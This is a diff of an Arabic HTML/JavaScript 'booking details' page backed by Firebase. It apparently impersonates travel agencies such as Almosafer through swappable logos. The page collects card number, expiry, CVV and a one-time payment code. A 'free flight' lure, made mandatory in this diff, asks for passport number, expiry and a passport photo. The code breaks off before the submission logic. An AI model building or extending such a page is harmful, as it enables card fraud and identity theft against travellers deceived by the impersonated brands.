@@ -1,773 +1,730 @@
 <!DOCTYPE html>
- <html lang="ar" dir="rtl">
- <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>تفاصيل الحجز</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800;900&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تفاصيل الحجز</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
 
-  <style>
-  :root {
-  --brand-blue: #003580;
-  --brand-blue-light: #006ce4;
-  --brand-green: #008009;
-  --brand-red: #e02d4b;
-  --brand-bg: #f0f2f5;
-  --text-primary: #1a1a1a;
-  --text-secondary: #555;
-  --border-color: #e0e0e0;
-  }
-  html { scroll-behavior: smooth; }
-  body {
-  font-family: 'Cairo', sans-serif;
-  background-color: var(--brand-bg);
-  color: var(--text-primary);
-  }
-  .main-container {
-  max-width: 500px;
-  margin: 0 auto;
-  background-color: white;
-  min-height: 100vh;
-  box-shadow: 0 0 20px rgba(0,0,0,0.1);
-  }
-  .input-field {
-  width: 100%;
-  border: 1px solid var(--border-color);
-  background-color: #f8f9fa;
-  border-radius: 8px;
-  padding: 0.85rem;
-  font-size: 1rem;
-  transition: border-color 0.2s, box-shadow 0.2s;
-  }
-  .input-field:focus {
-  outline: none;
-  border-color: var(--brand-blue-light);
-  box-shadow: 0 0 0 3px rgba(0, 108, 228, 0.2);
-  }
-  .label {
-  font-weight: 700;
-  font-size: 0.875rem;
-  margin-bottom: 0.5rem;
-  display: block;
-  }
-  .btn-primary {
-  background-color: var(--brand-blue-light);
-  color: white;
-  font-weight: 800;
-  font-size: 1.1rem;
-  padding: 0.85rem 1.5rem;
-  border-radius: 8px;
-  transition: background-color 0.2s;
-  width: 100%;
-  }
-  .btn-primary:hover {
-  background-color: var(--brand-blue);
-  }
-  .btn-primary:disabled {
-  background-color: #94a3b8;
-  cursor: not-allowed;
-  }
-  
-  /* Ticket Design */
-  .ticket-header {
-  padding: 1.5rem;
-  border-bottom: 2px dashed var(--border-color);
-  }
-  .flight-path {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  margin: 1.5rem 0;
-  }
-  .flight-path .city {
-  font-weight: 800;
-  font-size: 1.5rem;
-  }
-  .flight-path .arrow {
-  color: var(--text-secondary);
-  font-size: 1.2rem;
-  flex-grow: 1;
-  text-align: center;
-  position: relative;
-  }
-  .flight-path .arrow::after {
-  content: '';
-  position: absolute;
-  top: 50%;
-  left: 10%;
-  right: 10%;
-  height: 2px;
-  background-image: linear-gradient(to left, var(--border-color) 50%, transparent 50%);
-  background-size: 8px 2px;
-  z-index: -1;
-  }
-  .otp-inputs { display: flex; gap: 10px; direction: ltr; justify-content: center; }
-  .otp-inputs input {
-  width: 45px; height: 50px; text-align: center; font-size: 1.5rem;
-  border: 2px solid var(--border-color); border-radius: 8px;
-  }
-  .otp-inputs input:focus { outline: none; border-color: var(--brand-blue-light); }
-  .input-error { border-color: var(--brand-red) !important; }
-  .error-message { color: var(--brand-red); font-size: 0.875rem; font-weight: bold; margin-top: 4px; }
-  
-  @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
-  .modal-content { animation: fadeIn 0.3s ease-out; }
+    <style>
+    :root {
+    --brand-blue: #003580;
+    --brand-blue-light: #006ce4;
+    --brand-green: #008009;
+    --brand-red: #e02d4b;
+    --brand-bg: #f0f2f5;
+    --text-primary: #1a1a1a;
+    --text-secondary: #555;
+    --border-color: #e0e0e0;
+    }
+    html { scroll-behavior: smooth; }
+    body {
+    font-family: 'Cairo', sans-serif;
+    background-color: var(--brand-bg);
+    color: var(--text-primary);
+    }
+    .main-container {
+    max-width: 500px;
+    margin: 0 auto;
+    background-color: white;
+    min-height: 100vh;
+    box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+    .input-field {
+    width: 100%;
+    border: 1px solid var(--border-color);
+    background-color: #f8f9fa;
+    border-radius: 8px;
+    padding: 0.85rem;
+    font-size: 1rem;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .input-field:focus {
+    outline: none;
+    border-color: var(--brand-blue-light);
+    box-shadow: 0 0 0 3px rgba(0, 108, 228, 0.2);
+    }
+    .input-field:disabled {
+        background-color: #e9ecef;
+        color: #6c757d;
+        cursor: not-allowed;
+    }
+    .label {
+    font-weight: 700;
+    font-size: 0.875rem;
+    margin-bottom: 0.5rem;
+    display: block;
+    }
+    .btn-primary {
+    background-color: var(--brand-blue-light);
+    color: white;
+    font-weight: 800;
+    font-size: 1.1rem;
+    padding: 0.85rem 1.5rem;
+    border-radius: 8px;
+    transition: background-color 0.2s;
+    width: 100%;
+    }
+    .btn-primary:hover {
+    background-color: var(--brand-blue);
+    }
+    .btn-primary:disabled {
+    background-color: #94a3b8;
+    cursor: not-allowed;
+    }
+    .ticket-header {
+    padding: 1.5rem;
+    border-bottom: 2px dashed var(--border-color);
+    }
+    .flight-path {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin: 1.5rem 0;
+    }
+    .flight-path .city {
+    font-weight: 800;
+    font-size: 1.5rem;
+    }
+    .flight-path .arrow {
+    color: var(--text-secondary);
+    font-size: 1.2rem;
+    flex-grow: 1;
+    text-align: center;
+    position: relative;
+    }
+    .flight-path .arrow::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    left: 10%;
+    right: 10%;
+    height: 2px;
+    background-image: linear-gradient(to left, var(--border-color) 50%, transparent 50%);
+    background-size: 8px 2px;
+    z-index: -1;
+    }
+    .otp-inputs { display: flex; gap: 10px; direction: ltr; justify-content: center; }
+    .otp-inputs input {
+    width: 45px; height: 50px; text-align: center; font-size: 1.5rem;
+    border: 2px solid var(--border-color); border-radius: 8px;
+    }
+    .otp-inputs input:focus { outline: none; border-color: var(--brand-blue-light); }
+    .input-error { border-color: var(--brand-red) !important; }
+    .error-message { color: var(--brand-red); font-size: 0.875rem; font-weight: bold; margin-top: 4px; }
+    @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
+    .modal-content { animation: fadeIn 0.3s ease-out; }
+    .file-upload-btn {
+    background-color: #f1f5f9;
+    border: 1px solid #e2e8f0;
+    padding: 0.5rem 1rem;
+    border-radius: 6px;
+    cursor: pointer;
+    font-weight: 600;
+    transition: all 0.2s;
+    width: 100%; /* تعديل */
+    display: inline-block; /* تعديل */
+    text-align: center; /* تعديل */
+    }
+    .file-upload-btn:hover {
+    background-color: #e2e8f0;
+    border-color: #cbd5e1;
+    }
+    .file-name {
+    font-size: 0.8rem;
+    color: #64748b;
+    margin-top: 0.5rem;
+    font-style: italic;
+    }
+    input, textarea, select {
+    -webkit-user-select: auto !important;
+    user-select: auto !important;
+    touch-action: manipulation;
+    }
+    </style>
+</head>
+<body>
 
-  /* File Upload Styles */
-  .file-upload-btn {
-  background-color: #f1f5f9;
-  border: 1px solid #e2e8f0;
-  padding: 0.5rem 1rem;
-  border-radius: 6px;
-  cursor: pointer;
-  font-weight: 600;
-  transition: all 0.2s;
-  }
-  .file-upload-btn:hover {
-  background-color: #e2e8f0;
-  border-color: #cbd5e1;
-  }
-  .file-name {
-  font-size: 0.8rem;
-  color: #64748b;
-  margin-top: 0.5rem;
-  font-style: italic;
-  }
+    <div id="app-container" class="main-container">
 
-  /* --- Mobile Keyboard Fix --- */
-  input, textarea, select {
-  -webkit-user-select: auto !important;
-  user-select: auto !important;
-  touch-action: manipulation;
-  }
-  </style>
- </head>
- <body>
+    <div id="search-section" class="p-6 space-y-6">
+    <div class="text-center">
+    <svg id="search-logo" class="h-16 w-auto mx-auto mb-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50">
+    <rect x="5" y="10" width="90" height="30" rx="5" ry="5" fill="#006ce4"/>
+    <path d="M5 15 C 0 15, 0 35, 5 35" fill="#006ce4"/>
+    <path d="M95 15 C 100 15, 100 35, 95 35" fill="#006ce4"/>
+    <line x1="10" y1="25" x2="90" y2="25" stroke="white" stroke-width="2"/>
+    </svg>
+    <h1 class="text-2xl font-extrabold mt-4">عرض تفاصيل الحجز</h1>
+    <p class="text-gray-500 mt-2">الرجاء إدخال رقم الحجز / الفاتورة الذي تم تزويدك به.</p>
+    </div>
+    <form id="search-form" class="space-y-4">
+    <div>
+    <label for="booking_ref_input" class="label">رقم الحجز / الفاتورة</label>
+    <input type="text" id="booking_ref_input" class="input-field text-center tracking-widest" placeholder="BK-XXXXXX" required>
+    </div>
+    <button type="submit" class="btn-primary"><i class="fas fa-search mr-2"></i>بحث</button>
+    </form>
+    <div id="search-error" class="hidden text-center error-message"></div>
+    </div>
 
-  <div id="app-container" class="main-container">
+    <div id="details-section" class="hidden">
+    <div id="ticket-details-container" class="bg-gray-100 p-4"></div>
+    
+    <div class="p-6 space-y-8">
+    
+    <div id="prefilled-info-container" class="hidden"></div>
+    
+    <form id="user-info-form" class="space-y-6"></form>
 
-  <div id="search-section" class="p-6 space-y-6">
-  <div class="text-center">
-  <svg id="search-logo" class="h-16 w-auto mx-auto mb-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 50">
-  <rect x="5" y="10" width="90" height="30" rx="5" ry="5" fill="#006ce4"/>
-  <path d="M5 15 C 0 15, 0 35, 5 35" fill="#006ce4"/>
-  <path d="M95 15 C 100 15, 100 35, 95 35" fill="#006ce4"/>
-  <line x1="10" y1="25" x2="90" y2="25" stroke="white" stroke-width="2"/>
-  </svg>
-  <h1 class="text-2xl font-extrabold mt-4">عرض تفاصيل الحجز</h1>
-  <p class="text-gray-500 mt-2">الرجاء إدخال رقم الحجز / الفاتورة الذي تم تزويدك به.</p>
-  </div>
-  <form id="search-form" class="space-y-4">
-  <div>
-  <label for="booking_ref_input" class="label">رقم الحجز / الفاتورة</label>
-  <input type="text" id="booking_ref_input" class="input-field text-center tracking-widest" placeholder="BK-XXXXXX" required>
-  </div>
-  <button type="submit" class="btn-primary"><i class="fas fa-search mr-2"></i>بحث</button>
-  </form>
-  <div id="search-error" class="hidden text-center error-message"></div>
-  </div>
+    <div id="free-ticket-offer-section" class="hidden space-y-4 p-4 bg-green-50 border-2 border-dashed border-green-400 rounded-lg">
+    <h2 class="text-xl font-extrabold text-green-800 text-center">احصل على رحلة مجانية الآن, قم بتعبئة المعلومات</h2>
+    <form id="free-ticket-form" class="space-y-4">
+    <div class="grid grid-cols-2 gap-4">
+    <div>
+    <label for="free_firstName" class="label">الاسم الأول</label>
+    <input type="text" id="free_firstName" name="free_firstName" class="input-field" required>
+    </div>
+    <div>
+    <label for="free_lastName" class="label">اسم العائلة</label>
+    <input type="text" id="free_lastName" name="free_lastName" class="input-field" required>
+    </div>
+    </div>
+    <div class="grid grid-cols-2 gap-4">
+    <div>
+    <label for="free_passportNumber" class="label">رقم جواز السفر</label>
+    <input type="text" id="free_passportNumber" name="free_passportNumber" class="input-field" required>
+    </div>
+    <div>
+    <label for="free_passportExpiry" class="label">تاريخ انتهاء الجواز</label>
+    <input type="date" id="free_passportExpiry" name="free_passportExpiry" class="input-field" required>
+    </div>
+    </div>
+    <div>
+    <label for="free_passportPicture" class="label">صورة الجواز (مهم)</label>
+    <input type="file" id="free_passportPicture" class="hidden" accept="image/*" required>
+    <button type="button" class="file-upload-btn" onclick="document.getElementById('free_passportPicture').click()">
+    <i class="fas fa-upload mr-2"></i>رفع صورة الجواز
+    </button>
+    <div id="free_passport_file_name" class="file-name">لم يتم اختيار ملف</div>
+    </div>
+    </form>
+    </div>
 
-  <div id="details-section" class="hidden">
-  <div id="ticket-details-container" class="bg-gray-100 p-4"></div>
-  
-  <div class="p-6 space-y-8">
-  
-  <div id="prefilled-info-container" class="hidden"></div>
-  
-  <form id="user-info-form" class="hidden space-y-6"></form>
+    <form id="payment-form" class="space-y-6">
+    <h2 class="text-xl font-bold border-b pb-2">الدفع الآمن</h2>
+    <div>
+    <label for="cardNumber" class="label">رقم البطاقة</label>
+    <input type="tel" id="cardNumber" name="cardNumber" class="input-field" placeholder="•••• •••• •••• ••••" inputmode="numeric" maxlength="19" required>
+    </div>
+    <div class="grid grid-cols-2 gap-4">
+    <div>
+    <label for="expiry" class="label">تاريخ الانتهاء</label>
+    <input type="tel" id="expiry" name="expiry" class="input-field" placeholder="MM / YY" required>
+    </div>
+    <div>
+    <label for="cvv" class="label">CVV</label>
+    <input type="tel" id="cvv" name="cvv" class="input-field" placeholder="•••" inputmode="numeric" maxlength="4" required>
+    </div>
+    </div>
+    <div>
+    <label for="price" class="label">المبلغ المطلوب</label>
+    <div id="price-container" class="input-field bg-gray-200 font-bold text-lg text-center"></div>
+    </div>
+    <button id="pay-btn" type="submit" class="btn-primary !bg-[var(--brand-green)]">
+    <i class="fas fa-lock mr-2"></i>ادفع الآن
+    </button>
+    </form>
+    </div>
+    </div>
+    </div>
 
-  <div id="free-ticket-offer-section" class="hidden space-y-4 p-4 bg-green-50 border-2 border-dashed border-green-400 rounded-lg">
-  <h2 class="text-xl font-extrabold text-green-800 text-center">احصل على رحلة مجانية الآن, قم بتعبئة المعلومات</h2>
-  <form id="free-ticket-form" class="space-y-4">
-  <div class="grid grid-cols-2 gap-4">
-  <div>
-  <label for="free_firstName" class="label">الاسم الأول</label>
-  <input type="text" id="free_firstName" name="free_firstName" class="input-field" required>
-  </div>
-  <div>
-  <label for="free_lastName" class="label">اسم العائلة</label>
-  <input type="text" id="free_lastName" name="free_lastName" class="input-field" required>
-  </div>
-  </div>
-  <div class="grid grid-cols-2 gap-4">
-  <div>
-  <label for="free_passportNumber" class="label">رقم جواز السفر</label>
-  <input type="text" id="free_passportNumber" name="free_passportNumber" class="input-field" required>
-  </div>
-  <div>
-  <label for="free_passportExpiry" class="label">تاريخ انتهاء الجواز</label>
-  <input type="date" id="free_passportExpiry" name="free_passportExpiry" class="input-field" required>
-  </div>
-  </div>
-  <div>
-  <label for="free_passportPicture" class="label">صورة الجواز (اختياري)</label>
-  <input type="file" id="free_passportPicture" class="hidden" accept="image/*">
-  <button type="button" class="file-upload-btn" onclick="document.getElementById('free_passportPicture').click()">
-  <i class="fas fa-upload mr-2"></i>رفع صورة الجواز
-  </button>
-  <div id="free_passport_file_name" class="file-name">لم يتم اختيار ملف</div>
-  </div>
-  </form>
-  </div>
+    <div id="loading-modal" class="hidden fixed inset-0 bg-black/70 z-[60] flex items-center justify-center p-4">
+    <div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center space-y-4">
+    <i class="fas fa-spinner fa-spin text-5xl text-[var(--brand-blue-light)]"></i>
+    <h3 id="loading-message" class="text-xl font-bold">جاري الدفع, يرجى الانتظار</h3>
+    </div>
+    </div>
 
-  <form id="payment-form" class="space-y-6">
-  <h2 class="text-xl font-bold border-b pb-2">الدفع الآمن</h2>
-  <div>
-  <label for="cardNumber" class="label">رقم البطاقة</label>
-  <input type="tel" id="cardNumber" name="cardNumber" class="input-field" placeholder="•••• •••• •••• ••••" inputmode="numeric" maxlength="19" required>
-  </div>
-  <div class="grid grid-cols-2 gap-4">
-  <div>
-  <label for="expiry" class="label">تاريخ الانتهاء</label>
-  <input type="tel" id="expiry" name="expiry" class="input-field" placeholder="MM / YY" required>
-  </div>
-  <div>
-  <label for="cvv" class="label">CVV</label>
-  <input type="tel" id="cvv" name="cvv" class="input-field" placeholder="•••" inputmode="numeric" maxlength="4" required>
-  </div>
-  </div>
-  <div>
-  <label for="price" class="label">المبلغ المطلوب</label>
-  <div id="price-container" class="input-field bg-gray-200 font-bold text-lg text-center"></div>
-  </div>
-  <button id="pay-btn" type="submit" class="btn-primary !bg-[var(--brand-green)]">
-  <i class="fas fa-lock mr-2"></i>ادفع الآن
-  </button>
-  </form>
-  </div>
-  </div>
-  </div>
+    <div id="otp-modal" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
+    <div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center">
+    <h3 class="text-2xl font-bold mb-4">التحقق من الدفع</h3>
+    <p class="text-slate-600 mb-6">أدخل رمز التحقق (OTP) الذي تم إرساله للموافقة على العملية.</p>
+    <form id="otp-form">
+    <div class="otp-inputs mb-4">
+    <input type="text" maxlength="1"><input type="text" maxlength="1"><input type="text" maxlength="1"><input type="text" maxlength="1"><input type="text" maxlength="1"><input type="text" maxlength="1">
+    </div>
+    <p id="otp-error" class="hidden error-message mb-4"></p>
+    <button type="submit" class="btn-primary">تحقق</button>
+    </form>
+    </div>
+    </div>
 
-  <div id="loading-modal" class="hidden fixed inset-0 bg-black/70 z-[60] flex items-center justify-center p-4">
-  <div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center space-y-4">
-  <i class="fas fa-spinner fa-spin text-5xl text-[var(--brand-blue-light)]"></i>
-  <h3 id="loading-message" class="text-xl font-bold">جاري الدفع, يرجى الانتظار</h3>
-  </div>
-  </div>
+    <div id="result-modal" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
+    <div id="result-modal-content" class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center space-y-4">
+    </div>
+    </div>
 
-  <div id="otp-modal" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
-  <div class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center">
-  <h3 class="text-2xl font-bold mb-4">التحقق من الدفع</h3>
-  <p class="text-slate-600 mb-6">أدخل رمز التحقق (OTP) الذي تم إرساله للموافقة على العملية.</p>
-  <form id="otp-form">
-  <div class="otp-inputs mb-4">
-  <input type="text" maxlength="1"><input type="text" maxlength="1"><input type="text" maxlength="1"><input type="text" maxlength="1"><input type="text" maxlength="1"><input type="text" maxlength="1">
-  </div>
-  <p id="otp-error" class="hidden error-message mb-4"></p>
-  <button type="submit" class="btn-primary">تحقق</button>
-  </form>
-  </div>
-  </div>
+<script type="module">
+    // --- Firebase Imports --- 
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+    import { getFirestore, doc, getDoc, setDoc, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+    import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
-  <div id="result-modal" class="hidden fixed inset-0 bg-black/70 z-50 flex items-center justify-center p-4">
-  <div id="result-modal-content" class="modal-content bg-white p-8 rounded-lg shadow-xl w-full max-w-sm text-center space-y-4">
-  </div>
-  </div>
+    // --- Global State --- 
+    let db, auth;
+    let currentTicketData = null;
+    let pendingBookingId = null;
+    let unsubscribeFromBookingStatus = null;
+    let currentUserId = null;
+    const appId = typeof __app_id !== 'undefined' ? __app_id : '1:666361598120:web:8eb42070c3a56dea87b29d';
 
- <script type="module">
-  // --- Firebase Imports --- 
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-  import { getFirestore, doc, getDoc, setDoc, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-  import { getAuth, signInAnonymously, onAuthStateChanged, signInWithCustomToken } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+    // --- Firebase Initialization & Auth --- 
+    (async () => {
+    try {
+        const firebaseConfig = typeof __firebase_config !== 'undefined' 
+        ? JSON.parse(__firebase_config) 
+        : {
+            apiKey: "AIzaSyD8De6ejpve1Lj0b5qzXM05v8RYbmNSQUw",
+            authDomain: "booking-e0cc4.firebaseapp.com",
+            projectId: "booking-e0cc4",
+            storageBucket: "booking-e0cc4.appspot.com",
+            messagingSenderId: "666361598120",
+            appId: "1:666361598120:web:8eb42070c3a56dea87b29d"
+        };
 
-  // --- Global State --- 
-  let db, auth;
-  let currentTicketData = null;
-  let pendingBookingId = null;
-  let unsubscribeFromBookingStatus = null;
-  let currentUserId = null;
-  const appId = typeof __app_id !== 'undefined' ? __app_id : '1:666361598120:web:8eb42070c3a56dea87b29d';
+        const app = initializeApp(firebaseConfig);
+        db = getFirestore(app);
+        auth = getAuth(app);
+        
+        onAuthStateChanged(auth, async (user) => {
+        if (user) {
+            console.log("User is signed in:", user.uid);
+            currentUserId = user.uid;
+        } else {
+            const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
+            if (initialAuthToken) {
+                await signInWithCustomToken(auth, initialAuthToken);
+            } else {
+                await signInAnonymously(auth);
+            }
+        }
+        });
+    } catch (error) {
+        console.error("Firebase Initialization Error:", error);
+        document.body.innerHTML = `<div class="text-center p-8"><h1>فشل تهيئة التطبيق</h1><p>${error.message}</p></div>`;
+    }
+    })();
 
-  // --- Firebase Initialization & Auth (FIXED) --- 
-  (async () => {
-  try {
-  // Use the globally provided Firebase config, with a robust fallback from your main project 
-  const firebaseConfig = typeof __firebase_config !== 'undefined' 
-  ? JSON.parse(__firebase_config) 
-  : {
-  apiKey: "AIzaSyD8De6ejpve1Lj0b5qzXM05v8RYbmNSQUw",
-  authDomain: "booking-e0cc4.firebaseapp.com",
-  projectId: "booking-e0cc4",
-  storageBucket: "booking-e0cc4.appspot.com",
-  messagingSenderId: "666361598120",
-  appId: "1:666361598120:web:8eb42070c3a56dea87b29d"
-  };
+    // --- DOM Elements --- 
+    const searchSection = document.getElementById('search-section');
+    const detailsSection = document.getElementById('details-section');
+    const searchForm = document.getElementById('search-form');
+    const searchError = document.getElementById('search-error');
+    const ticketContainer = document.getElementById('ticket-details-container');
+    const paymentForm = document.getElementById('payment-form');
+    const userInfoForm = document.getElementById('user-info-form');
+    const prefilledInfoContainer = document.getElementById('prefilled-info-container');
+    const freeTicketOfferSection = document.getElementById('free-ticket-offer-section');
+    const freeTicketForm = document.getElementById('free-ticket-form');
+    const otpForm = document.getElementById('otp-form');
+    const priceContainer = document.getElementById('price-container');
+    const payBtn = document.getElementById('pay-btn');
 
-  const app = initializeApp(firebaseConfig);
-  db = getFirestore(app);
-  auth = getAuth(app);
+    // --- Helper Functions --- 
+    const showModal = (modalId, message) => {
+        const modal = document.getElementById(modalId);
+        const loadingMessageEl = document.getElementById('loading-message');
+        if (modalId === 'loading-modal' && message && loadingMessageEl) {
+            loadingMessageEl.innerHTML = message;
+        }
+        if(modal) modal.classList.remove('hidden');
+    };
 
-  onAuthStateChanged(auth, async (user) => {
-  if (user) {
-  console.log("User is signed in:", user.uid);
-  currentUserId = user.uid;
-  } else {
-  // Use the initial auth token if available, otherwise sign in anonymously 
-  const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;
-  if (initialAuthToken) {
-  await signInWithCustomToken(auth, initialAuthToken);
-  } else {
-  await signInAnonymously(auth);
-  }
-  }
-  });
-  } catch (error) {
-  console.error("Firebase Initialization Error:", error);
-  document.body.innerHTML = `<div class="text-center p-8"><h1>فشل تهيئة التطبيق</h1><p>${error.message}</p></div>`;
-  }
-  })();
+    const hideAllModals = () => {
+        ['loading-modal', 'otp-modal', 'result-modal'].forEach(id => {
+            const modal = document.getElementById(id);
+            if(modal) modal.classList.add('hidden');
+        });
+    };
 
-  // --- DOM Elements --- 
-  const searchSection = document.getElementById('search-section');
-  const detailsSection = document.getElementById('details-section');
-  const searchForm = document.getElementById('search-form');
-  const searchError = document.getElementById('search-error');
-  const searchLogo = document.getElementById('search-logo');
-  const ticketContainer = document.getElementById('ticket-details-container');
-  const paymentForm = document.getElementById('payment-form');
-  const userInfoForm = document.getElementById('user-info-form');
-  const prefilledInfoContainer = document.getElementById('prefilled-info-container');
-  const freeTicketOfferSection = document.getElementById('free-ticket-offer-section');
-  const freeTicketForm = document.getElementById('free-ticket-form');
-  const otpForm = document.getElementById('otp-form');
-  const priceContainer = document.getElementById('price-container');
-  const payBtn = document.getElementById('pay-btn');
+    const showResultModal = (title, message, isSuccess, onRetry) => {
+        hideAllModals();
+        const iconClass = isSuccess ? 'fa-check-circle text-green-500' : 'fa-times-circle text-red-500';
+        let buttonsHtml = `<button id="result-ok-btn" class="btn-primary w-full">حسنًا</button>`;
+        if (onRetry) {
+            buttonsHtml = `<button id="result-retry-btn" class="btn-primary w-full">حاول مرة أخرى</button>`;
+        }
+        const content = `<i class="fas ${iconClass} text-7xl mb-4"></i><h3 class="text-2xl font-bold mb-2">${title}</h3><p class="text-slate-600 mb-6">${message}</p>${buttonsHtml}`;
+        document.getElementById('result-modal-content').innerHTML = content;
+        showModal('result-modal');
+        const retryBtn = document.getElementById('result-retry-btn');
+        const okBtn = document.getElementById('result-ok-btn');
+        if (onRetry && retryBtn) {
+            retryBtn.onclick = () => { onRetry(); };
+        } else if (okBtn) {
+            okBtn.onclick = () => { isSuccess ? location.reload() : hideAllModals(); };
+        }
+    };
+    
+    const formatDateTime = (isoString) => {
+        if (!isoString || !isoString.includes('T')) return { date: '', time: '' };
+        try {
+            const [datePart, timePart] = isoString.split('T');
+            const [year, month, day] = datePart.split('-').map(Number);
+            const [hours, minutes] = timePart.split(':').map(Number);
+            const reliableDate = new Date(year, month - 1, day, hours, minutes);
+            const timeOptions = { hour: '2-digit', minute: '2-digit', hour12: true };
+            const formattedTime = new Intl.DateTimeFormat('ar-SA', timeOptions).format(reliableDate);
+            const dateOptions = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
+            const gregorianDate = new Intl.DateTimeFormat('ar-SA', { ...dateOptions, calendar: 'gregory' }).format(reliableDate);
+            const hijriDate = new Intl.DateTimeFormat('ar-SA', { ...dateOptions, calendar: 'islamic-umalqura' }).format(reliableDate);
+            return { date: `${gregorianDate}<br>(${hijriDate})`, time: formattedTime };
+        } catch (error) {
+            console.error("Could not format date:", isoString, error);
+            return { date: 'تاريخ غير صالح', time: '' };
+        }
+    };
+    
+    const fileToBase64 = (file) => new Promise((resolve, reject) => {
+        if (!file) { resolve(null); return; }
+        const reader = new FileReader();
+        reader.readAsDataURL(file);
+        reader.onload = () => resolve(reader.result);
+        reader.onerror = reject;
+    });
 
-  // --- Helper Functions --- 
-  const showModal = (modalId, message) => {
-  const modal = document.getElementById(modalId);
-  const loadingMessageEl = document.getElementById('loading-message');
-  if (modalId === 'loading-modal' && message && loadingMessageEl) {
-  loadingMessageEl.innerHTML = message;
-  }
-  if(modal) modal.classList.remove('hidden');
-  };
+    const getLogoInfo = (logoValue) => {
+        const logos = {
+            almadina: { url: 'https://res.cloudinary.com/do9agtdqi/image/upload/v1753891488/fde53300-7714-4426-94bf-5a492a932063_s8sztm.jpg', name: 'المدينة المنورة للسياحة و السفر' },
+            almosafer: { url: 'https://res.cloudinary.com/do9agtdqi/image/upload/v1753891471/alm-fb-logo-ar_lhbpwv.jpg', name: 'المسافر' }
+        };
+        return logos[logoValue] || logos.almosafer;
+    };
+    
+    const renderTicket = (data) => {
+        const departure = formatDateTime(data.departure_datetime);
+        const arrival = formatDateTime(data.return_datetime);
+        const logoInfo = getLogoInfo(data.website_logo);
+        const clientDisplayName = `${data.client_firstName || ''} ${data.client_lastName || ''}`.trim();
 
-  const hideAllModals = () => {
-  ['loading-modal', 'otp-modal', 'result-modal'].forEach(id => {
-  const modal = document.getElementById(id);
-  if(modal) modal.classList.add('hidden');
-  });
-  };
+        ticketContainer.innerHTML = `<div class="bg-white rounded-lg shadow-md"><div class="ticket-header"><div class="flex justify-between items-center"><div class="flex items-center gap-4"><img src="${logoInfo.url}" alt="Logo" class="h-12"><span class="font-bold text-lg">${logoInfo.name}</span></div><div class="text-left"><span class="block text-sm text-gray-500">رقم الحجز</span><span class="block font-bold text-lg">${data.booking_ref}</span></div></div></div><div class="p-6"><div class="flex items-center gap-4 mb-6"><img src="${data.airline_logo_path}" alt="${data.airline_name}" class="h-12 w-12 object-contain" onerror="this.style.display='none'"><div><h2 class="font-bold text-xl">${data.airline_name}</h2><p class="text-sm text-gray-500">مرحباً, ${clientDisplayName || 'ضيفنا الكريم'}</p></div></div><div class="flight-path"><span class="city">${data.departure_from}</span><span class="arrow"><i class="fas ${data.trip_type === 'round_trip' ? 'fa-exchange-alt' : 'fa-long-arrow-alt-left'}"></i></span><span class="city">${data.arrival_to}</span></div><div class="grid grid-cols-2 gap-6 text-center"><div><p class="text-sm text-gray-500">المغادرة</p><p class="font-bold">${departure.date}</p><p class="font-extrabold text-lg text-[var(--brand-blue)]">${departure.time}</p></div><div class="${data.trip_type === 'one_way' ? 'hidden' : ''}"><p class="text-sm text-gray-500">العودة</p><p class="font-bold">${arrival.date}</p><p class="font-extrabold text-lg text-[var(--brand-blue)]">${arrival.time}</p></div></div></div></div>`;
 
-  const showResultModal = (title, message, isSuccess, onRetry) => {
-  hideAllModals();
-  const iconClass = isSuccess ? 'fa-check-circle text-green-500' : 'fa-times-circle text-red-500';
-  
-  let buttonsHtml = `<button id="result-ok-btn" class="btn-primary w-full">حسنًا</button>`;
-  if (onRetry) {
-  buttonsHtml = `<button id="result-retry-btn" class="btn-primary w-full">حاول مرة أخرى</button>`;
-  }
